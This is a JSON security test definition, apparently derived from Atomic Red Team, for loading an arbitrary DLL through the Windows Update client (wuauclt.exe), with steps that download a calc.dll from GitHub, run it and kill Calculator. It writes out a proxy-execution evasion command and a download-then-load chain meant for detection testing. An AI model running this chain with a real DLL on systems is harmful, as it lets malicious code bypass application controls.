{
  "id": "49fbd548-49e9-4bb7-94a6-3769613912b8",
  "name": "Load Arbitrary DLL via Wuauclt (Windows Update Client)",
  "description": "This test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched. \nSee https://dtm.uk/wuauclt/\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "ed7f0e3b-0c74-46e6-ac20-625372582520",
      "type": "execute-command",
      "data": {
        "command": "wuauclt.exe /UpdateDeploymentProvider \"#{arbitrary_dll}\" /RunHandlerComServer\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "242ada4e-fbde-4bdd-a444-ade6dcac07ec",
      "type": "execute-command",
      "data": {
        "command": "taskkill /f /im calculator.exe \u003e nul 2\u003e\u00261",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "5e04c2d2-f227-4450-9fed-2885c7b0ce8f",
      "name": "Check dependency 1/1",
      "description": "DLL to load must exist on disk as specified location (#{arbitrary_dll})\n",
      "type": "execute-command",
      "data": {
        "command": "if (test-path \"#{arbitrary_dll}\"){exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "536a4506-f45d-40df-ac3b-f51128e33085",
      "name": "Resolve dependency 1/1",
      "description": "DLL to load must exist on disk as specified location (#{arbitrary_dll})\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory (split-path \"#{arbitrary_dll}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true\" -OutFile \"#{arbitrary_dll}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "c15fe6cc-6bc2-4aca-9dd2-666f630c6eef",
      "name": "Re-check dependency 1/1",
      "description": "DLL to load must exist on disk as specified location (#{arbitrary_dll})\n",
      "type": "execute-command",
      "data": {
        "command": "if (test-path \"#{arbitrary_dll}\"){exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "ed7f0e3b-0c74-46e6-ac20-625372582520",
      "p": "on-success",
      "o": "242ada4e-fbde-4bdd-a444-ade6dcac07ec"
    },
    {
      "s": "ed7f0e3b-0c74-46e6-ac20-625372582520",
      "p": "on-failure",
      "o": "242ada4e-fbde-4bdd-a444-ade6dcac07ec"
    },
    {
      "s": "5e04c2d2-f227-4450-9fed-2885c7b0ce8f",
      "p": "on-success",
      "o": "ed7f0e3b-0c74-46e6-ac20-625372582520"
    },
    {
      "s": "5e04c2d2-f227-4450-9fed-2885c7b0ce8f",
      "p": "on-failure",
      "o": "536a4506-f45d-40df-ac3b-f51128e33085"
    },
    {
      "s": "536a4506-f45d-40df-ac3b-f51128e33085",
      "p": "on-success",
      "o": "c15fe6cc-6bc2-4aca-9dd2-666f630c6eef"
    },
